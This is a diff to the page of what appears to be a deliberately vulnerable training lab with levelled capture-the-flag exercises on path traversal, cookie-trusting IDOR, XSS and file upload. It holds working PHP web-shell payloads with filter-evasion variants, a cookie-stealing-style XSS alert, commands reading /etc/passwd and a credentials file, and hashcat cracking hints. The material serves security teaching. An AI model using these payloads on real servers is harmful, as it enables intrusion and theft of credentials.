@@ -114,7 +114,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Page: LFI (leveled) -->
 <div class="card"><h2><code>home.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
-  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates.</p>
+  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates (hard→<code>php://filter</code> base64, expert→rot13 — decode the output). Same dir also has <code>flag_b64.txt</code> (base64) and <code>flag_salted.txt</code> (salted md5 → <code>hashcat -m 10</code> → monkey) for decode/crack practice.</p>
   <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
     <code class="pl" id="pl_pg"></code><button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button></details>
@@ -206,7 +206,7 @@ PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw 
 PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — the app trusts a uid cookie)",n:"Expert — the ?id is ignored; the app trusts a 'uid' cookie. Easiest: click 'become uid=1 (admin) ▶' below (sets a uid cookie scoped to /profile.php, so only this exercise is touched). Manual/classic way: DevTools → Application → Cookies → add uid=1, then Run. Both work."}};
 PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no content checks."},medium:{p:"<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Medium — 'system' blocked in content -> passthru()."},hard:{p:"<\x3Fphp echo `$_GET[cmd]`; ?\x3E",n:"Hard — exec-family blocked -> backticks."},expert:{p:"<\x3Fphp $f='sy'.'stem'; $f($_GET['cmd']); ?\x3E",n:"Expert — backticks blocked -> split the name (sy.stem -> system)."}};
 // Per-level webshell objective: a DIFFERENT real post-exploitation use case at each level.
-PAYLOADS.upcmd={easy:{cmd:"id",why:"confirm which OS user the web server runs as"},medium:{cmd:"cat /etc/passwd",why:"enumerate the local user accounts"},hard:{cmd:"cat ../private/db_credentials.txt",why:"loot stored credentials (the DB password)"},expert:{cmd:"cat ../private/upload_flag.txt",why:"exfiltrate the target secret (the flag)"}};
+PAYLOADS.upcmd={easy:{cmd:"cat ../private/upload_flag.txt",why:"read the flag — PLAINTEXT"},medium:{cmd:"cat ../private/upload_flag.b64",why:"flag is BASE64 — pipe the output to `base64 -d`"},hard:{cmd:"cat ../private/upload_flag.md5",why:"flag is an UNSALTED md5 — hashid then hashcat -m 0 rockyou (-> sunshine)"},expert:{cmd:"cat ../private/upload_flag.sha256salt",why:"flag is a SALTED sha256 (hash:salt) — hashcat -m 1410 rockyou (-> pokemon)"}};
 var _ready=false;
 function setLvl(card,lvl){
   var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
